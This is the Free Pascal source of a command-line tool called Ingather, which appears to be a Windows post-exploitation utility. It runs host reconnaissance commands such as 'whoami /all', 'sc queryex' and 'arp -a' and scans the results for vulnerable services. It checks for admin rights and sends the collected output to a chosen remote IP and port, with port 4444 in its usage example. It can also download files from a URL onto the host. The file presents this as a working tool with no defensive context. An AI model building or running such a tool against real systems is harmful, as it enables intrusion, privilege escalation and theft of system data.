program Ingather;

{$mode objfpc}{$H+}

uses
  Classes, SysUtils, CustApp, RunAs, NetIO, FindVulns, RunCMD
  { you can add units after this };

type

  { TIngather }

  TIngather = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
  end;

{ TIngather }

procedure TIngather.DoRun;
const
  NUM_CMDS = 5;
  CMD      : array[1..NUM_CMDS] of string = ('ipconfig /all','ver','sc queryex','whoami /all','arp -a');
var
  ErrorMsg     : String;
  ip           : AnsiString;
  port         : AnsiString;
  outfile      : AnsiString;
  nwrk         : TNetIO;
  escalate     : TRunAs;
  vulns        : TFindVulns;
  OutputStream : TStream;
  execute      : TRunCMD;
  x            : Integer;
  output       : AnsiString;
  tfOut        : TextFile;
  download     : String;
  save         : String;
begin
  output:= ''; // initialize the string

  // quick check parameters
  ErrorMsg:= CheckOptions('dehiposz','download enum help ip out port save');
  if ErrorMsg <> '' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h','help') or (ParamCount = 0) then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  // download file
  if HasOption('d','download') and HasOption('s','save') then begin
    nwrk:= TNetIO.Create;
    download:= Self.GetOptionValue('d','download');
    save:= Self.GetOptionValue('s','save');
    if HasOption('z') then
      nwrk.WinHTTPGet(download, save)
    else begin
      ErrorMsg:= nwrk.DownloadHTTP(download, save);
      writeln(ErrorMsg);
    end;
    nwrk.Free;
  end;

  // do vulnerability enumeration on host
  if HasOption('e','enum') then begin
    vulns:= TFindVulns.Create;
    execute:= TRunCMD.Create;
    for x:= 1 to NUM_CMDS do begin
      OutputStream:= execute.Run(CMD[x]);
      output:= concat(output, vulns.StreamToString(OutputStream));
    end;
    vulns.getVulnServices(Output);
    execute.Free;
    vulns.Free;

    // Is user an admin
    escalate:= TRunAs.Create;
    if escalate.IsUserAdmin then
      writeln('You are an admin!!!')
    else
      writeln('You are not an admin.');
    {if escalate.RunAsAdmin(0, 'whoami', '/all') then
      writeln('You are not an admin!!!')
    else
      writeln('Did not run as admin!!!');}
    escalate.Free;

    // Send output to another computer?
    if HasOption('i','ip') and HasOption('p','port') then begin
      nwrk:= TNetIO.Create;
      ip:= Self.GetOptionValue('i','ip');
      port:= Self.GetOptionValue('p','port');
      nwrk.SendIt(ip, port, output);
      nwrk.Free;
    end;

    // Write all command outputs to file?
    if HasOption('o','out') then begin
      outfile:= Self.GetOptionValue('o','out');
      AssignFile(tfOut, outfile);
      rewrite(tfOut);
      writeln(tfOut, output);
    end;

    // Clean up
    OutputStream.Free;
  end;

  Terminate;
end;

constructor TIngather.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:= True;
end;

destructor TIngather.Destroy;
begin
  inherited Destroy;
end;

procedure TIngather.WriteHelp;
begin
  writeln;
  writeln('Usage: Ingather.exe --enum -i 1.1.1.1 -p 4444 -o output.txt');
  writeln('       Ingather.exe --download http://www.abcded.com/abc.txt --save c:\temp\abc.text');
  writeln;
  writeln('Download file:');
  writeln('       -d --download    : download file');
  writeln('       -s --save        : location to save downloaded file to');
  writeln('       -z               : use the Windows HTTP download function');
  writeln('                          otherwise use custom HTTP download function');
  writeln('Enumerate vulnerabilities:');
  writeln('       -e --enum        : enumerate host vulnerabilities');
  writeln('Output options:');
  writeln('       -h --help        : print this help message');
  writeln('       -i --ip          : destination IP address');
  writeln('       -p --port        : destination port');
  writeln('       -o --out         : write enumeration command outputs to file');
end;

var
  Application: TIngather;
begin
  Application:= TIngather.Create(nil);
  Application.Title:= 'Ingather';
  Application.Run;
  Application.Free;
end.

